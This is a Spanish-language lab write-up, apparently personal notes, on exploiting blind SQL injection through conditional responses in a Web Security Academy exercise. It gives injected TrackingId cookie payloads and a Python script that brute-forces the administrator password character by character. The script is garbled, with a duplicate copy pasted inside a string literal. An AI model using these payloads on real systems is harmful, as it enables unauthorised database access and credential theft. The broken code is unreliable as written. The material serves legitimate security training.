La idea de este tipo de ataques es que la web es vulnerable a SQLi pero a la hora de inyectar querys vemos cambios en el comportamiento de la web pero no vemos la salida directamente por lo que nos basamos es esas respuestas condicionales de la web para extraer información

En este caso explotaremos nuevamente las tracking id ([[Exploiting blind SQL injection by triggering conditional responses]]) y emplearemos caido para hacer fuerza bruta

```http
// En este caso vemos que con 1=1 se muestra el mensaje welcome y con 1=2 no se muestra siendo vulnerable
Cookie: TrackingId=gdFX0T2vTzlEi85Q' and 1=1--;
```

Con esta logica y ademas en este ejercicio sabemos que existe una tabla llamada users con columas username y password podemos verficar si el username de administrator comienza con a, si es verdad se muestra el welcome 


```http
// administrator comienza con la letra a es True
Cookie: TrackingId=gdFX0T2vTzlEi85Q' and ( select substring(username,1,1) from users where username='administrator' )='a'--;
```

Con esta logica podemos comenzar a fuzzear la data del contenido de password (una vez encontrada la primer letra nos movemos a la siguiente con subtring(password,2,1))

Para **automatizar** este fuzzing podemos usar el automate de Caido para introduccir un diccionario con la posible letras o podemos hacer un script de python

**Caido**
1) cargamos el payload en automate
2) Vemos que debe haber uno que tenga un tamaño diferente a los demas significa que es verdadero(ya que ese muestra el mensaje de welcome)
![[fuzzcaido.png]]
3) Ya adivinamos el primer carácter (es un 2) y seguimos así hasta encontrarlos todos

### Python

Preferi hacerlo con python `  and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -` se van intercambiando esos valores para fuzzear las contraseña esto fue mucho mejor

```py
#!/usr/bin/env python3

from pwn import *
from termcolor import colored
import requests
import sys
import signal
import string

def handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo"), 'red')
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, handler)

characteres= string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

def makeSQLi():
    p1.status("Iniciando fuerza bruta")

    password = ""

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characteres:
            cookies = {
                'TrackingId': f"LkUilJbh6SbiKunf'  and (select substring(password,{position},1) from users where username=#!/usr/bin/env python3

​￼def handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo"), 'red')
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, handler)

characteres= string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

​￼def makeSQLi():
    p1.status("Iniciando fuerza bruta")

    password = ""

    p2 = log.progress("Password")

    ​￼for position in range(1,21):
        ​￼for character in characteres:
            ​￼cookies = {
                'TrackingId': f"LkUilJbh6SbiKunf'  and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
                'session':  "GMuEVMBnAVuFhCIzRpcrPuzjQn1T995b"
            }

            p1.status(cookies["TrackingId"])

            ​￼try:
                r = requests.get("https://0a1300c203a0f6df82021f34001700f4.web-security-academy.net/", cookies=cookies, timeout=5)
            ​￼except requests.exceptions.RequestException:
                continue

            ​￼if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

​￼if __name__ == '__main__':
    makeSQLi()'administrator')='{character}'-- -",
                'session':  "GMuEVMBnAVuFhCIzRpcrPuzjQn1T995b"
            }

            p1.status(cookies["TrackingId"])

            try:
                r = requests.get("https://0a1300c203a0f6df82021f34001700f4.web-security-academy.net/", cookies=cookies, timeout=5)
            except requests.exceptions.RequestException:
                continue

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
```
